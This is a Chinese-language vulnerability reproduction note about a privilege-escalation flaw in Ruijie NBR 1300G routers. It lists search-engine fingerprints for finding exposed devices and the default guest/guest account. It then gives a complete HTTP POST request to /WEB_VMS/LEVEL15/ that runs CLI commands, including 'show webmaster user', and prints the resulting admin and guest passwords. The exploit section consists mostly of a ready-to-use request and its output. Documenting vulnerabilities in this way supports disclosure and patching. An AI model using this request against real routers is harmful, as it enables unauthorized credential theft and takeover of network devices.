# 锐捷 NBR 1300G路由器 越权CLI命令执行漏洞

## 漏洞描述

锐捷NBR 1300G路由器 越权CLI命令执行漏洞，guest账户可以越权获取管理员账号密码

## 漏洞影响

<a-checkbox checked>锐捷NBR路由器</a-checkbox></br>

## 网络测绘

<a-checkbox checked>title="锐捷网络 --NBR路由器--登录界面"</a-checkbox></br>

<a-checkbox checked>app="Ruijie-NBR路由器"	</a-checkbox></br>

## 漏洞复现

登录页面如下



![img](../../../.vuepress/public/img/ruijie-35.png)



查看流量发现 CLI命令流量



![img](../../../.vuepress/public/img/ruijie-36.png)



请求包为



```plain
POST /WEB_VMS/LEVEL15/ HTTP/1.1
Host: 
Connection: keep-alive
Content-Length: 73
Authorization: Basic
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36
Content-Type: text/plain;charset=UTF-8
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
Cookie: auth=; user=
x-forwarded-for: 127.0.0.1
x-originating-ip: 127.0.0.1
x-remote-ip: 127.0.0.1
x-remote-addr: 127.0.0.1

command=show version&strurl=exec%04&mode=%02PRIV_EXEC&signname=Red-Giant.
```



测试发现执行其他命令需要权限，查看手册发现存在低权限 guest账户（guest/guest）



登录后发送请求包，执行CLI命令 `(show webmaster user)` 查看用户配置账号密码



![img](../../../.vuepress/public/img/ruijie-37.png)



成功获取所有用户的账号密码



```plain
webmaster level 0 username admin password guest
webmaster level 0 username guest password guest
```



## 